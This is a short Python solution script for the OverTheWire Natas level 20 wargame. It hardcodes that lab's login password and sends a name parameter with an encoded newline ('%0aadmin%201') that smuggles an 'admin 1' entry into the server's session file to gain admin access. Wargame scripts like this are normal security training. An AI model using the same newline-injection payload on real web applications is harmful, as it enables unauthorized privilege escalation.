import requests

url = 'http://natas20.natas.labs.overthewire.org/'
uName = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

#need to persist the sessid because myread() will use that to read our injected file
s=requests.Session()
#gettting mywrite() to write admin 1 
r = s.get(url,auth=(uName,password),params=('debug&name=kushal%0aadmin%201'))
print(r.url,r.text,"="*100)
#since we are in the same session we can access out file with "admin 1"
r = s.get(url,auth=(uName,password),params=('debug&name=kushal%0aadmin%201'))
print(r.url,r.text,"="*100)